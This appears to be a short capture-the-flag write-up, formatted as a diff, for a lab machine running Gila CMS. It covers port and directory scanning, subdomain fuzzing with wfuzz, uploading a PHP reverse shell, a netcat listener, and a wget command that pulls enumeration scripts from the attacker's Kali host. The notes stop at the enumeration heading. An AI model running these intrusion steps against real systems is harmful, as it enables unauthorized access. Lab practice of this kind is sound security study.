@@ -1,0 +1,67 @@
+Specific Box rule:
+    Please add 10.10.122.156 cmess.thm to /etc/hosts
+
+1st- Enumeration:
+    Nmap Scan:
+    PORT   STATE SERVICE REASON  VERSION
+    22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    | http-robots.txt: 3 disallowed entries 
+    |_/src/ /themes/ /lib/
+    |_http-generator: Gila CMS
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Robots.txt:
+    User-agent: *
+    Disallow: /src/
+    Disallow: /themes/
+    Disallow: /lib/
+
+    Powered by Gila CMS
+
+    Apache/2.4.18 
+
+    OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
+
+    Nikto Web Server scan:
+        http://10.10.122.156/admin/config.php:
+            Brute Force ?
+
+    Directory Busting:
+        gobuster dir -u http://10.10.122.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+
+    Burpsuite:
+        login:
+            username=user%40user.com&password=user
+            
+        Response:
+            Wrong email or password
+
+1st* Sub-domain Ennumeration (We need DSN Resolve for this Fuzzing):
+    wfuzz -c -f sub-fighter -w top5000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm" --hw 290 <--- Top5000.txt from https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt
+
+    we find "http://dev.cmess.thm" <-- we need to add to our etc/hosts
+
+    We upload a reverse_shell.phtml
+    
+Exploit:
+    We setup nc -lvnp <PORT>
+    invoke the shell by URL 
+
+    We get the shell
+
+    try to go to /tmp to upload some scripts - for this machine we use 'linenum.sh':
+        Kali:
+            python3 -m http.server <Port>
+
+        Linux:    
+            wget http://<Kali IP>/<script> 
+            curl -f cache 
+
+
+        Linenum.sh Enumeration:
